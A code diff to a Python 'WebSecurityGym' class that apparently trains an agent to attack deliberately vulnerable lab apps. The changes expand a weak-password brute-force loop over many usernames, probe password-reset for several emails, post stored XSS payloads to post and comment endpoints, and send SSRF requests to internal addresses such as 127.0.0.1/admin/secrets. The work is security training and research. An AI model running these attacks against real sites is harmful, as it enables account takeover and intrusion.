@@ -926,21 +926,33 @@ class WebSecurityGym(gym.Env):
 
     def test_weak_passwords(self):
         """Test common weak passwords."""
-        weak_passwords = ["password", "123456", "admin", "user", "test"]
-        for password in weak_passwords:
-            try:
-                response = self.session.post(
-                    f"{self.target_url}/api/login",
-                    json={"username": "test", "password": password},
-                    timeout=self.timeout,
-                )
-                if response.status_code == 200:
-                    reward = self._update_state_from_response(
-                        response, "weak_password_success"
+        weak_passwords = ["password", "password123", "123456", "admin", "test"]
+        usernames = [
+            "admin",
+            "user",
+            "user1",
+            "john_doe",
+            "tech_writer",
+            "travel_blogger",
+            "weak_user",
+        ]
+
+        for username in usernames:
+            for password in weak_passwords:
+                try:
+                    response = self.session.post(
+                        f"{self.target_url}/api/login",
+                        json={"username": username, "password": password},
+                        timeout=self.timeout,
                     )
-                    return response, reward
-            except:
-                continue
+                    if response.status_code == 200:
+                        self.auth_token = "SESSION"
+                        reward = self._update_state_from_response(
+                            response, "weak_password_success"
+                        )
+                        return response, reward
+                except:
+                    continue
         return self._update_state_error()
 
     def test_session_fixation(self):
@@ -971,19 +983,27 @@ class WebSecurityGym(gym.Env):
 
     def test_password_reset(self):
         """Test password reset functionality."""
-        try:
-            response = self.session.post(
-                f"{self.target_url}/api/password-reset",
-                json={"email": "test@example.com"},
-                timeout=self.timeout,
-            )
-            if response.status_code == 200:
-                reward = self._update_state_from_response(
-                    response, "password_reset_functional"
+        candidate_emails = [
+            "user1@social.com",
+            "user2@social.com",
+            "weak@social.com",
+            "admin@ecommerce.com",
+            "test@example.com",
+        ]
+        for email in candidate_emails:
+            try:
+                response = self.session.post(
+                    f"{self.target_url}/api/password-reset",
+                    json={"email": email},
+                    timeout=self.timeout,
                 )
-                return response, reward
-        except:
-            pass
+                if response.status_code == 200:
+                    reward = self._update_state_from_response(
+                        response, "password_reset_functional"
+                    )
+                    return response, reward
+            except:
+                continue
         return self._update_state_error()
 
     def test_login_bypass(self):
@@ -1687,8 +1707,16 @@ class WebSecurityGym(gym.Env):
         credentials = [
             ("admin", "admin123"),
             ("admin", "password"),
+            ("user1", "password123"),
+            ("user2", "password123"),
+            ("weak_user", "password"),
             ("john_doe", "password"),
             ("user", "password"),
+            ("tech_writer", "password"),
+            ("travel_blogger", "password"),
+            ("food_critic", "password"),
+            ("lifestyle_guru", "password"),
+            ("dev_blogger", "password"),
         ]
 
         for login_url in login_endpoints:
@@ -1916,37 +1944,78 @@ class WebSecurityGym(gym.Env):
     def attack_xss_stored_posts(self) -> Tuple[requests.Response, float]:
         """Stored XSS in Posts (Action 66)."""
         if not self.auth_token:
-            return None, -5.0
+            self.action_login_valid()
 
         payload = self.payload_manager.get_xss("simple")
 
-        # Target: Social Media Post
-        r = self.session.post(
-            f"{self.target_url}/api/posts",
-            json={"title": "Hacked", "content": payload},
-            headers={"Authorization": f"Bearer {self.auth_token}"},
-            timeout=3,
-        )
+        headers = {}
+        if self.auth_token and self.auth_token != "SESSION":
+            headers["Authorization"] = f"Bearer {self.auth_token}"
 
-        return r, self._calculate_reward(r, "XSS_STORED")
+        post_attempts = [
+            (
+                f"{self.target_url}/api/posts",
+                {"title": "Hacked", "content": payload},
+                "json",
+            ),
+            (
+                f"{self.target_url}/new-post",
+                {"title": "Hacked", "content": payload},
+                "form",
+            ),
+        ]
+
+        for url, data, payload_type in post_attempts:
+            try:
+                if payload_type == "json":
+                    r = self.session.post(url, json=data, headers=headers, timeout=3)
+                else:
+                    r = self.session.post(url, data=data, headers=headers, timeout=3)
+
+                if r.status_code != 404:
+                    return r, self._calculate_reward(r, "XSS_STORED")
+            except Exception:
+                continue
+
+        return self._update_state_error()
 
     def attack_xss_stored_comments(self) -> Tuple[requests.Response, float]:
         """Stored XSS in Comments (Action 67)."""
         if not self.auth_token:
-            return None, -5.0
+            self.action_login_valid()
 
         payload = self.payload_manager.get_xss("simple")
 
-        # Target: Social Media Comment
-        # Try to comment on post 1
-        r = self.session.post(
-            f"{self.target_url}/api/posts/1/comments",
-            json={"content": payload},
-            headers={"Authorization": f"Bearer {self.auth_token}"},
-            timeout=3,
-        )
+        headers = {}
+        if self.auth_token and self.auth_token != "SESSION":
+            headers["Authorization"] = f"Bearer {self.auth_token}"
 
-        return r, self._calculate_reward(r, "XSS_STORED")
+        comment_attempts = [
+            (
+                f"{self.target_url}/api/posts/1/comments",
+                {"content": payload},
+                "json",
+            ),
+            (
+                f"{self.target_url}/post/1/comment",
+                {"content": payload},
+                "form",
+            ),
+        ]
+
+        for url, data, payload_type in comment_attempts:
+            try:
+                if payload_type == "json":
+                    r = self.session.post(url, json=data, headers=headers, timeout=3)
+                else:
+                    r = self.session.post(url, data=data, headers=headers, timeout=3)
+
+                if r.status_code != 404:
+                    return r, self._calculate_reward(r, "XSS_STORED")
+            except Exception:
+                continue
+
+        return self._update_state_error()
 
     def attack_xss_stored(self) -> Tuple[requests.Response, float]:
         """Legacy helper / Fallback."""
@@ -2030,13 +2099,31 @@ class WebSecurityGym(gym.Env):
 
         # Blog App Target
         if "5005" in self.target_url or "blog" in self.target_url.lower():
-            # Requires Login usually, but we try anyway or rely on session
-            r = self.session.post(
-                f"{self.target_url}/import_post", data={"url": payload}, timeout=3
-            )
-            return r, self._calculate_reward(
-                r, "SSRF_Internal" if "127.0.0.1" in payload else "SSRF"
-            )
+            if not self.auth_token:
+                self.action_login_valid()
+
+            blog_payloads = [
+                "http://127.0.0.1/admin/secrets",
+                "http://localhost/flag_ssrf",
+                payload,
+            ]
+
+            for blog_payload in blog_payloads:
+                try:
+                    r = self.session.post(
+                        f"{self.target_url}/import_post",
+                        data={"url": blog_payload},
+                        timeout=3,
+                    )
+                    if r.status_code != 404:
+                        vuln_type = (
+                            "SSRF_Internal"
+                            if "127.0.0.1" in blog_payload or "flag_ssrf" in blog_payload
+                            else "SSRF"
+                        )
+                        return r, self._calculate_reward(r, vuln_type)
+                except Exception:
+                    continue
 
         # General Target
         url = self._find_best_url(["fetch", "import", "proxy", "load"], "/fetch_url")
